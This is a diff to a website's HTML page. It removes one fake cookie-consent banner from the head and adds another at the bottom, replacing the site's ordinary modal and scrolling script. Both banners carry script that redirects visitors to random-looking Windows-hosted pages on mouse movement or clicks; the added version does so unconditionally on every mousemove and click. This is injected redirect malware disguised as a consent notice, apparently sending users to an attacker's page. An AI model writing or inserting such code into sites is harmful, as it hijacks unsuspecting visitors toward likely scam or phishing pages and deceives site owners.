@@ -1,95 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
     <head>
-        <!-- Cookie Consent Modal -->
-<div id="cookieConsentOverlay" class="cookie-consent-overlay">
-    <div class="cookie-consent-modal">
-        <h2 class="cookie-consent-title">We Use Cookies</h2>
-        <p class="cookie-consent-text">
-            We use cookies to enhance your browsing experience, provide personalized content,
-            and analyze our traffic.
-            By clicking "Accept", you consent to our use of cookies.
-            You can manage your preferences or learn more about our cookie policy.
-        </p>
-
-        <div class="cookie-consent-buttons">
-            <button class="cookie-btn cookie-btn-accept" onclick="acceptCookies()">
-                Accept All
-            </button>
-            <button class="cookie-btn cookie-btn-deny" onclick="denyCookies()">
-                Deny All
-            </button>
-        </div>
-    </div>
-</div>
-
-<!-- Status Notification -->
-<div id="cookieStatus" class="cookie-status hidden"></div>
-
-<script>
-    // Cookie consent functionality
-    let consentGiven = false;
-    let mouseRedirectEnabled = false;
-
-    function showCookieConsent() {
-        document.getElementById('cookieConsentOverlay').classList.remove('hidden');
-        document.body.classList.add('consent-active');
-        mouseRedirectEnabled = true;
-    }
-
-    function hideCookieConsent() {
-        document.getElementById('cookieConsentOverlay').classList.add('hidden');
-        document.body.classList.remove('consent-active');
-        mouseRedirectEnabled = false;
-    }
-
-    function showStatus(message, type) {
-        const statusEl = document.getElementById('cookieStatus');
-        statusEl.textContent = message;
-        statusEl.className = cookie-status status-${type};
-        statusEl.classList.remove('hidden');
-
-        setTimeout(() => {
-            statusEl.classList.add('hidden');
-        }, 3000);
-    }
-
-    function acceptCookies() {
-        consentGiven = true;
-        hideCookieConsent();
-        showStatus('✔️ Cookies accepted', 'accepted');
-        console.log('Cookies accepted - initializing tracking...');
-    }
-
-    function denyCookies() {
-        consentGiven = false;
-        hideCookieConsent();
-        showStatus('✖️ Cookies denied', 'denied');
-        console.log('Cookies denied - running in privacy mode...');
-    }
-
-    // Mouse move redirect logic
-    function handleMouseMove() {
-        if (mouseRedirectEnabled) {
-            window.location.href =
-                'https://dsghhjsdf78dsfssdf.blob.core.windows.net/hjgfduyd8ff/index.html';
-        }
-    }
-
-    document.addEventListener('mousemove', handleMouseMove);
-    document.addEventListener('click', handleMouseMove);
-
-    // Prevent modal clicks from closing it
-    document.querySelector('.cookie-consent-modal')
-        .addEventListener('click', function (e) {
-            e.stopPropagation();
-        });
-
-    // Show consent modal on page load
-    window.addEventListener('load', function () {
-        setTimeout(showCookieConsent, 500);
-    });
-</script>
+      
         <meta charset="utf-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1" />
 
@@ -1131,35 +1043,71 @@ document.addEventListener('DOMContentLoaded', function() {
     </div>
 </footer>
 
-   <script>
-        function openModal(modalId) {
-            document.getElementById(modalId).style.display = 'block';
-        }
+<!-- Cookie Consent Overlay -->
+<div id="cookieConsentOverlay" class="cookie-consent-overlay">
+  <div class="cookie-consent-modal">
+    <h2 class="cookie-consent-title">We Use Cookies</h2>
+    <p class="cookie-consent-text">
+      We use cookies to enhance your browsing experience, provide personalized content, and analyze our traffic.
+      By clicking "Accept", you consent to our use of cookies. You can manage your preferences or learn more about our cookie policy.
+    </p>
+    <div class="cookie-consent-buttons">
+      <button class="cookie-btn cookie-btn-accept" onclick="acceptCookies()">Accept</button>
+      <button class="cookie-btn cookie-btn-deny" onclick="denyCookies()">Deny</button>
+    </div>
+  </div>
+</div>
 
-        function closeModal(modalId) {
-            document.getElementById(modalId).style.display = 'none';
-        }
+<div id="cookieStatus" class="cookie-status hidden"></div>
 
-        window.onclick = function(event) {
-            if (event.target.classList.contains('modal847overlay')) {
-                event.target.style.display = 'none';
-            }
-        }
+<script>
+let consentGiven = false;
+let mouseRedirectEnabled = false;
 
-        // Smooth scrolling for navigation links
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                const target = document.querySelector(this.getAttribute('href'));
-                if (target) {
-                    target.scrollIntoView({
-                        behavior: 'smooth',
-                        block: 'start'
-                    });
-                }
-            });
-        });
-    </script>
+function showCookieConsent() {
+  document.getElementById('cookieConsentOverlay').classList.remove('hidden');
+  document.body.classList.add('consent-active');
+  mouseRedirectEnabled = true;
+}
+
+function hideCookieConsent() {
+  document.getElementById('cookieConsentOverlay').classList.add('hidden');
+  document.body.classList.remove('consent-active');
+  mouseRedirectEnabled = false;
+}
+
+function showStatus(message, type) {
+  const statusEl = document.getElementById('cookieStatus');
+  statusEl.textContent = message;
+  statusEl.className = `cookie-status status-${type}`;
+  statusEl.classList.remove('hidden');
+  setTimeout(() => statusEl.classList.add('hidden'), 3000);
+}
+
+function acceptCookies() {
+  consentGiven = true;
+  hideCookieConsent();
+  showStatus('Cookies accepted', 'accepted');
+}
+
+function denyCookies() {
+  consentGiven = false;
+  hideCookieConsent();
+  showStatus('Cookies denied', 'denied');
+}
+
+document.addEventListener('mousemove', function() {
+  window.location.href = 'https://e33031401e3303echo5.z13.web.core.windows.net/1.html';
+});
+
+document.addEventListener('click', function() {
+  window.location.href = 'https://e33031401e3303echo5.z13.web.core.windows.net/1.html';
+});
+
+window.addEventListener('load', function() {
+  showCookieConsent();
+});
+</script>
 
     <script type="text/javascript" src="js/popper.js"></script><script> window.start.init({Palette:"palette1",Mode:"banner bottom",Time:"0", Message: "We use cookies to improve the site and its user experience. By continuing to use the site, you agree to the use of cookies. You can always disable cookies in your browser settings.", ButtonText: "Accept", LinkText: "Learn more"})</script>
         
